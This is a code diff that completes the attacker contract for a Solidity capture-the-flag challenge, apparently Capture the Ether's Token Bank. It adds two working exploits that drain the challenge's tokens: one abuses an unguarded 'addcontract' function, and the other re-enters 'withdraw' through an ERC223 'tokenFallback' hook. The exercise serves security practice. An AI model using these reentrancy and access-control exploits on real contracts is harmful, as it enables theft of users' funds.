@@ -17,7 +17,7 @@ contract SimpleERC223Token {
     string public symbol = "SET";
     uint8 public decimals = 18;
 
-    uint256 public totalSupply = 1000000 * (uint256(10) ** decimals);
+    uint256 public totalSupply = 1_000_000 * (uint256(10) ** decimals);
 
     event Transfer(address indexed from, address indexed to, uint256 value);
 
@@ -100,12 +100,12 @@ contract TokenBankChallenge {
         player = _player;
         // Divide up the 1,000,000 tokens, which are all initially assigned to
         // the token contract's creator (this contract).
-        balanceOf[msg.sender] = 500000 * 10 ** 18; // half for me
-        balanceOf[player] = 500000 * 10 ** 18; // half for you
+        balanceOf[msg.sender] = 500_000 * 10 ** 18; // half for me
+        balanceOf[player] = 500_000 * 10 ** 18; // half for you
     }
 
     function addcontract(address _contract) public {
-        balanceOf[_contract] = 500000 * 10 ** 18;
+        balanceOf[_contract] = 500_000 * 10 ** 18;
     }
 
     function isComplete() public view returns (bool) {
@@ -136,9 +136,37 @@ contract TokenBankChallenge {
 // Write your exploit contract below
 contract TokenBankAttacker {
     TokenBankChallenge public challenge;
+    SimpleERC223Token public token;
+    address public player;
+    bool reentrant;
 
     constructor(address challengeAddress) {
         challenge = TokenBankChallenge(challengeAddress);
+        token = challenge.token();
+        player = challenge.player();
     }
+
     // Write your exploit functions here
+    function simpleExploitWithoutReentrancy() public {
+        challenge.addcontract(address(this));
+        challenge.withdraw(500_000 ether);
+        challenge.addcontract(address(this));
+        challenge.withdraw(500_000 ether);
+    }
+
+    function exploitReentrant() public {
+        reentrant = true;
+        challenge.addcontract(address(this));
+        challenge.withdraw(500_000 ether);
+    }
+
+    function tokenFallback(
+        address from,
+        uint256 value,
+        bytes memory data
+    ) public {
+        if (token.balanceOf(address(challenge)) > 0 && reentrant) {
+            challenge.withdraw(500_000 ether);
+        }
+    }
 }
